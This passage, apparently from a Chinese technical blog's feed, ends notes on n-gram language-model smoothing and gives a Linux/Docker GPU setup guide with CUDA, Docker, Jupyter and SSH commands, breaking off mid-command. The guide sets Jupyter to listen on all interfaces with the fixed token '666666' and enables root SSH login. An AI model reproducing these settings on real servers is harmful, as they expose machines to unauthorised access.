class="math inline">\(Zipf\)</span>定律：一般来说，出现一次的词的数量比出现两次的多，出现两次的比出现三次的多，这种规律称为Zipf定律(Zipf’s Law)，即 r 越大，词的数量 <span class="math inline">\(N_r\)</span> 越小。</p></blockquote><blockquote><p>这样就给未出现的词赋予了一个很小的非零值，从而解决了零概率的问题。同时下调了出现频率很低的词的概率。</p><p>实际运用中，一般只对出现次数低于某个阈值的词下调频率，然后把下调得到的频率总和给未出现的词。</p></blockquote><p>于是：</p><ul><li>对于频率超过一定阈值的词，它们的概率估计就是它们在语料库中的相对频度，</li><li>对于频率小于阈值的词，它们的概率估计就小于它们的相对频度，并且出现次数越少，折扣越多</li><li>对于未看见的词，也给与了一个比较小的概率</li></ul><h4><span id="卡茨退避法折扣">卡茨退避法（折扣）</span></h4><p>由前 IBM 科学家卡茨(S.M.Katz)提出。</p><p><span class="math inline">\(\sum_{w_{i-1},w_i\text{ seen}}P(w_i\midw_{i-1})\lt1\)</span>类似古德-图灵估计的方法。这意味着有一部分概率量没有分配出去，留给了没有看到的二元组<span class="math inline">\((w_{i−1},w_{i})\)</span>：</p><p><span class="math display">\[P(w_i\midw_{i-1})=\begin{cases}f(w_i\mid w_{i-1})\quad\text{if }N(w_{i-1},w_i)\ge T \\f_{gt}(w_i\mid w_{i-1})\quad\text{if }0\lt N(w_{i-1},w_i)\lt T\\ Q(w_{i-1})\cdot f(w_i)\quad\text{otherwise}\end{cases}\]</span></p><p>其中 T 是阈值，一般在 8−10 左右，函数 <span class="math inline">\(f_{gt}()\)</span>表示经过古德-图灵估计后的相对频度。而</p><p><span class="math display">\[Q(w_{i-1})=\frac{1-\sum_{w_i \text{seen}}P(w_i\mid w_{i-1})}{\sum_{w_i\text{ unseen}}f(w_i)}\]</span></p><p>类似地，对于三元模型，概率估计的公式如下：</p><p><span class="math display">\[P(w_i\midw_{i-2},w_{i-1})=\begin{cases}f(w_i\mid w_{i-2},w_{i-1})\quad\text{if}N(w_{i-2,}w_{i-1},w_i) \ge T \\f_{gt}(w_i\midw_{i-2,}w_{i-1})\quad\text{if }0\lt N(w_{i-2},w_{i-1},w_i)\lt T \\Q(w_{i-2},w_{i-1})\cdot P(w_i\midw_{i-1})\quad\text{otherwise}\end{cases}\]</span></p><h4><span id="absolute-discounting">Absolute discounting</span></h4><p>Absolute discounting包括了对高阶和低阶模型的差值，然而它并不是用高阶模型的 P 乘以一个lambda，而是从每个非零计数里减掉一个固定的 discount δ∈[0,1]，作为testset的计数。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20191204002247856.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20191204002432034.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="kneser-ney-smoothing">Kneser-Ney smoothing</span></h4><p>Absolute discounting 的一个扩展，对回退部分做了一个修正。</p><p>只有在高阶模型的计数很小或者为 0 时，低阶模型才显得重要，(只有在bigram 没有出现过时，unigram 才有用)。针对该目的进行优化。</p><p>目的： capture the diversity of contexts for the word。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20191204002716604.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="modified-kneser-neysmoothing">Modified Kneser-Neysmoothing</span></h4><p>根据高阶模型（k元）的相对大小，对低阶模型得到的部分进行比例分配。</p><p><strong>目前在很多情况下，效果最好的平滑方法</strong>。</p><h3><span id="kenlm工具构建语言模型">KenLM工具构建语言模型</span></h3><p>https://kheafield.com/code/kenlm/</p><p>​ 使用了Modified Kneser-Ney smoothing的语言模型工具包。安装和使用见<a href="https://github.com/RacleRay/NotesForBlogs/blob/master/KenLM_language_model_package.ipynb">notebook</a>。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pip install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/kpu/</span>kenlm<span class="hljs-regexp">/archive/m</span>aster.zip<br></code></pre></div></td></tr></table></figure><h2><span id="神经语言预训练语言模型">神经语言预训练语言模型</span></h2><blockquote><p>BERT，GPT等，同样可以应用在以上领域。相关部分在后面笔记中给出。</p></blockquote><p><strong>参考资料</strong>:</p><ul><li><p><a href="https://karpathy.github.io/2015/05/21/rnn-effectiveness/">AndrejKarpathy的RNN博客</a></p></li><li><p><a href="https://medium.com/syncedreview/language-model-a-survey-of-the-state-of-the-art-technology-64d1a2e5a466">LanguageModel: A Survey of the State-of-the-Art Technology</a></p><p>传统n-gram模型简单实用，但是<strong>数据的稀疏性和泛化能力</strong>有很大的问题。</p></li></ul><blockquote><p>​当新的文本中出现意义相近但是没有在训练文本中出现的单词或者单词组的时候，传统离散模型无法正确计算这些训练样本中未出现的单词的应有概率，他们都会被赋予0概率预测值。</p><p>​除了对未出现的单词本身进行预测非常困难之外，离散模型还依赖于固定单词组合，需要完全的模式匹配，否则也无法正确输出单词组出现的概率。</p><p>​离散模型在计算上还存在“维度诅咒”的困难。假设我们的词库有一万个独立单词，对于一个包含4个单词的词组模式，潜在的单词组合多达<span class="math inline">\(10000^4\)</span>。</p></blockquote><p>神经网络模型：<strong>前馈神经网络模型（FFLM）</strong>和<strong>循环神经网络模型（RNNLM）</strong>。前者主要设计来解决稀疏性问题，而后者主要设计来解决泛化能力，尤其是对长上下文信息的处理。</p><h3><span id="前馈神经网络模型fflm">前馈神经网络模型（FFLM）</span></h3><p>Bengio等人提出的第一个前馈神经网络模型利用一个三层，包含一个嵌入层、一个全连接层、一个输出层，的全连接神经网络模型来估计给定n-1个上文的情况下，第n个单词出现的概率。其架构如下图所示：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20200223232709790.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>FFLM假设每个输入都是独立的。而循环神经网络的结构能利用文字的这种上下文序列关系。</p><h3><span id="循环神经网络模型rnnlm"><strong>循环神经网络模型（RNNLM）</strong></span></h3><p>循环神经网络模型不要求固定窗口的数据训练。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20200223232953572.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>RNN语言模型训练过程：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20200223233329671.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>RNN语言模型反向传播:</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20200223233353866.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="语言模型评估">语言模型评估</span></h3><p>困惑度（perplexity），其基本思想是给测试集的句子赋予较高概率值的语言模型较好。perplexity越小，句子概率越大，语言模型越好。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20200223233555030.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>也就是，<span class="math inline">\(2^{-crossentropyloss}\)</span></p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20200223234948452.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/2-语言模型.assets/image-20200223234903732.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> language model </tag>
            
            <tag> smoothing </tag>
            
            <tag> KenLM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux+Docker深度学习环境</title>
      <link href="/posts/accc2125.html"/>
      <url>/posts/accc2125.html</url>
      
        <content type="html"><![CDATA[<h2><span id="docker中搭建深度学习环境">Docker中搭建深度学习环境</span></h2><h3><span id="宿主机部分">宿主机部分</span></h3><blockquote><p>apt源修改：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak<br><br>lsb_release -c  <span class="hljs-comment"># 系统版本</span><br><br>sudo vim /etc/apt/sources.list<br></code></pre></div></td></tr></table></figure><p>写入</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get upgrade<br></code></pre></div></td></tr></table></figure></blockquote><p>安装python和pip</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-get install python3<br>apt-get install python3-pip<br></code></pre></div></td></tr></table></figure><p>配置软连接</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ln -s /usr/<span class="hljs-built_in">local</span>/python3/bin/python3 /usr/bin/python3<br>ln -s /usr/<span class="hljs-built_in">local</span>/python3/bin/pip3 /usr/bin/pip3<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir ~/.pip<br><span class="hljs-built_in">cd</span> ~/.pip<br>touch pip.conf<br>cat &gt;&gt; ~/.pip/pip.conf &lt;&lt; EOF<br>[global]<br>timeout = 6000<br>index-url = https://pypi.tuna.tsinghua.edu.cn/simple<br>trusted-host = pypi.tuna.tsinghua.edu.cn<br>EOF<br></code></pre></div></td></tr></table></figure><p><a href="https://link.zhihu.com/?target=https%3A//developer.nvidia.com/cuda-toolkit-archive">查询CUDA</a>，按照官网指示安装，可选择不同方法，local或者network等</p><p>注意！！</p><blockquote><p>云主机上安装cuda时，可能需要加上 --no-opengl-libs</p></blockquote><p><a href="https://link.zhihu.com/?target=http%3A//www.nvidia.com/Download/index.aspx">查询驱动版本</a>：可手动下载安装包到本地安装</p><p>首先卸载掉之前的显卡驱动：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-get remove –purge nvidia*<br></code></pre></div></td></tr></table></figure><p>也可使用命令查看推荐驱动</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ubuntu-drivers devices<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt install --no-install-recommends　&lt;推荐驱动&gt;<br></code></pre></div></td></tr></table></figure><p>下载不了可添加ppa</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo add-apt-repository ppa:graphics-drivers/ppa<br>sudo apt-get update<br>sudo apt install &lt;推荐驱动&gt;<br></code></pre></div></td></tr></table></figure><blockquote><p>之前安装过cuda需要重新安装的话可以选择先卸载，以免和新的 CUDA版本产生冲突:</p><p>/usr/local/cuda/bin 目录下有一个 uninstallcuda*.pl 文件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">./uninstall_cuda_10.0.pl<br></code></pre></div></td></tr></table></figure><p>可能会卸载不干净, 可以再执行命令删除cuda目录</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rm -rf /usr/bin/cuda<br>rm -rf /usr/bin/cuda-10.0<br></code></pre></div></td></tr></table></figure></blockquote><p><a href="https://link.zhihu.com/?target=https%3A//developer.nvidia.com/rdp/cudnn-archive">查询下载cudnn</a></p><p>解压下载的文件，可以看到cuda文件夹，在当前目录打开终端，执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cp cuda/include/cudnn.h /usr/<span class="hljs-built_in">local</span>/cuda/include/<br>cp cuda/lib64/libcudnn* /usr/<span class="hljs-built_in">local</span>/cuda/lib64/<br><br>chmod a+r /usr/<span class="hljs-built_in">local</span>/cuda/include/cudnn.h<br>chmod a+r /usr/<span class="hljs-built_in">local</span>/cuda/lib64/libcudnn*<br></code></pre></div></td></tr></table></figure><blockquote><p>网络下载速度快也可以参考tensorflow官网的教程：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># https://www.tensorflow.org/install/gpu#install_cuda_with_apt</span><br><span class="hljs-comment"># Add NVIDIA package repositories</span><br>wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-repo-ubuntu1804_10.1.243-1_amd64.deb<br>sudo dpkg -i cuda-repo-ubuntu1804_10.1.243-1_amd64.deb<br>sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub<br>sudo apt-get update<br>wget http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64/nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.deb<br>sudo apt install ./nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.deb<br>sudo apt-get update<br><br><span class="hljs-comment"># Install NVIDIA driver</span><br>sudo apt-get install --no-install-recommends nvidia-driver-418　<span class="hljs-comment"># 可更改为推荐版本</span><br><span class="hljs-comment"># Reboot. Check that GPUs are visible using the command: nvidia-smi</span><br><br><span class="hljs-comment"># Install development and runtime libraries (~4GB)</span><br>sudo apt-get install --no-install-recommends  --no-opengl-libs  \<br> cuda-10-1 \<br> libcudnn7=7.6.4.38-1+cuda10.1  \<br> libcudnn7-dev=7.6.4.38-1+cuda10.1<br><br><span class="hljs-comment"># 执行inference加速的服务器安装，也可开发调试</span><br><span class="hljs-comment"># Install TensorRT. Requires that libcudnn7 is installed above.</span><br>sudo apt-get install -y --no-install-recommends libnvinfer6=6.0.1-1+cuda10.1 \<br> libnvinfer-dev=6.0.1-1+cuda10.1 \<br> libnvinfer-plugin6=6.0.1-1+cuda10.1<br></code></pre></div></td></tr></table></figure></blockquote><hr><h4><span id="云主机挂载新分区">云主机挂载新分区</span></h4><p>查看是否有多余的盘比如<strong>/dev/vdb</strong></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">fdisk -l<br></code></pre></div></td></tr></table></figure><p>如果有则进行分区</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">fdisk /dev/vdb<br></code></pre></div></td></tr></table></figure><p>进入交互：</p><blockquote><p>1.输入 n 并按回车键：创建一个新分区。 2.输入 p并按回车键：选择主分区。因为创建的是一个单分区数据盘，所以只需要创建主分区。3.输入分区编号并按回车键。可以输入 1。4.输入第一个可用的扇区编号：按回车键采用默认值 1。5.输入最后一个扇区编号：因为这里仅创建一个分区，所以按回车键采用默认值。6.输入 wq 并按回车键，开始分区。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#是否有新分区 /dev/vdb1</span><br>fdisk -l<br></code></pre></div></td></tr></table></figure><p>挂载文件系统</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#/mnt是宿主机的目录</span><br>mount /dev/vdb1 /mnt<br></code></pre></div></td></tr></table></figure><p>查看挂载是否成功</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">df -h<br></code></pre></div></td></tr></table></figure><hr><h3><span id="docker部分">Docker部分</span></h3><p>安装docker ce，根据官网教程</p><hr><h4><span id="nvidia-containertoolkit"></span></h4><p>目前已经不推荐使用nvidia-docker2了，直接使用nvidia-container-toolkit　即可。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Add the package repositories</span><br>distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ID</span><span class="hljs-variable">$VERSION_ID</span>)<br>curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -<br>curl -s -L https://nvidia.github.io/nvidia-docker/<span class="hljs-variable">$distribution</span>/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list<br><br>sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit<br>sudo systemctl restart docker<br></code></pre></div></td></tr></table></figure><p>Usage</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#### Test nvidia-smi with the latest official CUDA image</span><br>docker run --gpus all nvidia/cuda:10.0１base nvidia-smi<br><br><span class="hljs-comment"># Start a GPU enabled container on two GPUs</span><br>docker run --gpus 2 nvidia/cuda:10.１-base nvidia-smi<br><br><span class="hljs-comment"># Starting a GPU enabled container on specific GPUs</span><br>docker run --gpus <span class="hljs-string">'"device=1,2"'</span> nvidia/cuda:10.１-base nvidia-smi<br>docker run --gpus <span class="hljs-string">'"device=UUID-ABCDEF,1"'</span> nvidia/cuda:10.１-base nvidia-smi<br><br><span class="hljs-comment"># Specifying a capability (graphics, compute, ...) for my container</span><br><span class="hljs-comment"># Note this is rarely if ever used this way</span><br>docker run --gpus all,capabilities=utility nvidia/cuda:10.１-base nvidia-smi<br></code></pre></div></td></tr></table></figure><p>nivdia官方镜像：https://gitlab.com/nvidia/container-images/cuda/blob/master/doc/supported-tags.md</p><p>pytorch镜像：https://hub.docker.com/r/opencompetition/opencompetition</p><p>tensorflow镜像：https://www.tensorflow.org/install/docker</p><hr><h4><span id="optional修改docker本地镜像与容器的存储位置">（Optional）修改Docker本地镜像与容器的存储位置</span></h4><blockquote><p>如果根分区太小的话</p><p>首先停掉Docker服务：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">systemctl stop docker<br></code></pre></div></td></tr></table></figure><p>然后移动整个/var/lib/docker目录到目的路径：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo mv /var/lib/docker &lt;目标路径&gt;<br>sudo ln -s &lt;目标路径&gt; /var/lib/docker<br></code></pre></div></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">systemctl start docker<br></code></pre></div></td></tr></table></figure></blockquote><hr><h4><span id="optional修改用户密码">（Optional）修改用户密码</span></h4><p>ubuntu的默认root密码是随机的，每次开机都会有一个新的root密码。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo passwd<br></code></pre></div></td></tr></table></figure><p>然后会提示输入当前用户的密码。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">su root<br></code></pre></div></td></tr></table></figure><p>转为root后，修改用户密码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo passwd user<br></code></pre></div></td></tr></table></figure><hr><h4><span id="常用docker操作">常用Docker操作</span></h4><p>image，镜像，是一个个配置好的环境。container，容器，是image的具体实例。</p><p><code>docker run [-it] some-image</code> 创建某个镜像的容器</p><p><code>docker ps</code>列出当前运行的容器</p><p><code>docker ps -a</code>列出所有的容器，包括运行的和不运行的</p><p><code>docker rm container-id</code>删除某个容器</p><p><code>docker start [-i] container-id</code><strong>启动</strong>某个容器，必须是已经创建的</p><blockquote><p><code>　　-i</code><strong>进入交互模式</strong>，还有一种方法：dockerattach container-id</p></blockquote><blockquote><p>CTRL+D或者输入exit，退出</p></blockquote><p><code>docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH</code>容器到主机</p><p><code>docker cp [OPTIONS] SRC_PATH CONTAINER:DEST_PATH</code>主机到容器</p><p>eg:<code>docker cp /home/racle/package_data nlptools:/home/deepspeed/package_data</code></p><p>停止、重启：</p><p><code>docker stop container-id</code></p><p><code>docker restart container-id</code></p><p>给镜像打标签</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker tag &lt;image id&gt; username/imagename:version<br></code></pre></div></td></tr></table></figure><hr><h4><span id="映射">映射</span></h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo docker run -it /<br>    --gpus all　/<br>    -p 8000:22 /<br>    -p 9999:8888 /<br>    --ipc=host /<br>    -v &lt;主机文件路径&gt;:&lt;容器文件路径&gt; /<br>    --name &lt;名称&gt; /<br>    &lt;image id&gt;<br></code></pre></div></td></tr></table></figure><p>-p 9999:8888 把主机的9999端口映射到容器的8888端口</p><p>-p 8000:22 留一个端口映射到容器22端口，因为SFTP默认使用22端口。</p><p>--ipc=host 让容器与主机共享内存</p><p>-v <主机文件路径>:<容器文件路径> 文件路径映射 e.g.<code>/home/racle/dockerVol/:/home/ralce/</code></容器文件路径></主机文件路径></p><p>或者容器启动的时候挂载目录</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">--mount type&#x3D;bind,source&#x3D;paht,target&#x3D;path<br></code></pre></div></td></tr></table></figure><h4><span id="jupyter-notebook">jupyter notebook</span></h4><p>创建了容器之后，启动jupyter notebook：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">jupyter-notebook --generate-config<br>sed -i <span class="hljs-string">'s/#c.NotebookApp.allow_password_change/c.NotebookApp.allow_password_change/g'</span> ~/.jupyter/jupyter_notebook_config.py<br><br>cat &gt;&gt; ~/.jupyter/jupyter_notebook_config.py &lt;&lt; EOF<br>c = get_config()<br>c.NotebookApp.ip = <span class="hljs-string">'*'</span><br>c.NotebookApp.open_browser = False<br>c.NotebookApp.port = 8888<br>c.NotebookApp.token=<span class="hljs-string">'666666'</span><br>EOF<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">jupyter notebook --no-browser --ip=0.0.0.0 --notebook-dir=<span class="hljs-string">''</span><br></code></pre></div></td></tr></table></figure><p><code>--no-browser</code>即不通过浏览器启动</p><p><code>--allow-root</code>允许root模型运行</p><hr><h4><span id="端口配置">端口配置</span></h4><p>容器里</p><blockquote><p>配置SSH服务，首先安装<code>*openssh-server*</code>:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt install -y openssh-server<br></code></pre></div></td></tr></table></figure><p>建立一个配置文件夹并进行必要的配置：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ mkdir /var/run/sshd<br>$ sudo passwd<br><span class="hljs-comment"># 这里设置的root密码，一定要记住！</span><br><span class="hljs-comment"># 使用其他用户连接，可用root权限设置密码：  passwd username</span><br><br><span class="hljs-comment"># 将#PermitRootLogin prohibit-password 替换为 PermitRootLogin yes</span><br>$ sed -i <span class="hljs-string">'s/#PermitRootLogin prohibit-password/PermitRootLogin yes/'</span> 